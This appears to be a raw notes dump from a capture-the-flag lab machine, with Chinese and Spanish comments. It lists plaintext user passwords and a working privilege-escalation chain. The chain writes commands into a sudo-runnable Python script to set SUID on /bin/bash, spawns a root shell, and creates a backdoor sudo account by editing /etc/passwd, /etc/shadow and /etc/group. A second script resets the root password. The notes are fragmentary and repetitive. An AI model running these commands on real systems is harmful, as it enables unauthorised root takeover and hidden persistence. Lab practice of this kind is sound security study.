bob
Password:  a7gyqqp6bt2!uv@2u

sam
Password: Welcome2024!


dean
Password: MasterOfPuppets1986

john: 
Password: TI!Powerful2024


```bash
bash-5.2# export PATH=$PATH:/usr/sbin:/sbin:/usr/local/sbin
```


echo 'import os; os.system("chmod +s /bin/bash")' > /home/john/tools/backup.py

echo 'import os; os.system("apt update && apt install openscap-scanner -y")' > /home/john/tools/backup.py
 
echo 'import os; os.system("echo 'root:auditor2026' | chpasswd")' > /home/john/tools/backup.py

sudo /usr/bin/python3 /home/john/tools/backup.py


john@TheHackersLabs-Gyhabogados:~$ sudo /usr/bin/python3 /home/john/tools/backup.py
john@TheHackersLabs-Gyhabogados:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1265648 Mar 29  2024 /bin/bash
可以看到/bin/bash已成功设置SUID位。现在执行bash -p即可获得一个euid为0的root权限Shell。

john@TheHackersLabs-Gyhabogados:~$ bash -p


bash-5.2# useradd -m -s /bin/bash auditor
bash-5.2# echo "auditor:auditor2026" | chpasswd
bash-5.2# usermod -aG sudo auditor


echo "auditor:x:1002:" >> /etc/group


bash-5.2# userdel -rf auditor 2>/dev/null; sed -i '/^auditor:/d' /etc/passwd /etc/shadow /etc/group; useradd -m -s /bin/bash -c "Auditor" auditor 2>/dev/null || (echo "auditor:x:1002:1002:Auditor:/home/auditor:/bin/bash" >> /etc/passwd && echo "auditor:x:1002:" >> /etc/group && mkdir -p /home/auditor && cp -r /etc/skel/. /home/auditor/ 2>/dev/null && chown -R auditor:auditor /home/auditor); echo "auditor:auditor2026" | chpasswd 2>/dev/null || (HASH=$(openssl passwd -6 auditor2026); echo "auditor:${HASH}:20692:0:99999:7:::" >> /etc/shadow); su - auditor



bash-5.2# apt install openscap-scanner



# 1. Crear un script para cambiar contraseña de root
bash-5.2# cat > /home/john/tools/reset_root.py << 'EOF'
import os
import subprocess

# Cambiar contraseña de root
os.system('echo "root:RootPassword2026!" | chpasswd')

# Desbloquear cuenta root (por si está bloqueada)
os.system('passwd -u root 2>/dev/null')

# Verificar que funcionó
result = subprocess.run(['passwd', '-S', 'root'], capture_output=True, text=True)
print(f"Estado de root: {result.stdout}")

print("¡Contraseña de root cambiada exitosamente!")
print("Nueva contraseña: RootPassword2026!")
EOF

# 2. Hacer ejecutable
bash-5.2# chmod +x /home/john/tools/reset_root.py

# 3. Salir de shell root y ejecutar con sudo
bash-5.2# exit
john@...$ sudo /usr/bin/python3 /home/john/tools/reset_root.py

# 4. Ahora puedes hacer su -
john@...$ su -
# Contraseña: RootPassword2026!
# ¡Eres root real!

# 5. Instalar openscap-scanner
root@...$ apt update && apt install openscap-scanner -y